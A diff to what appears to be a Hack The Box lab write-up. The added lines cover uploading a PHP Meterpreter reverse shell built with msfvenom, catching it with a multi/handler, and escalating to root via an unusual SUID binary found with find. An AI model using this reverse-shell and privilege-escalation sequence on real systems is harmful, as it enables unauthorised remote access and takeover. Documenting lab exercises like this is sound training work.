@@ -30,4 +30,15 @@ Nmap done: 1 IP address (1 host up) scanned in 38.35 seconds
 - 68576f20e9732f1b2edc4df5b8533230.acc we open it using vscode and found some creds
 - we also have alogin page we try the creds and we got in there are 2 pages we review the source code of each of them on the support page we found in the source code a line that says any .htb will be executed as .php
 - Generate a reverse PHP shell with msfvenom -p php/meterpreter/reverse_tcp lhost=<LAB IP> lport=<PORT> -f raw > writeup.htb and upload it
-using the form found in the support page 
+using the form found in the support page
+- open msfconsole set multi/handler ,set payload payload/php/meterpreter/reverse_tcp and exploit
+- go to /uploads/**shell.htb**
+- and we got shell
+# privilage escalation
+- find / -type f -user root -perm -4000 2>/dev/null
+- to search for all SUID binaries owned by root on the system
+- the first one seems out of ordinary /var/htb/bin/emergency
+- i just passed this in the shell and got root
+```
+/var/htb/bin/emergency
+```
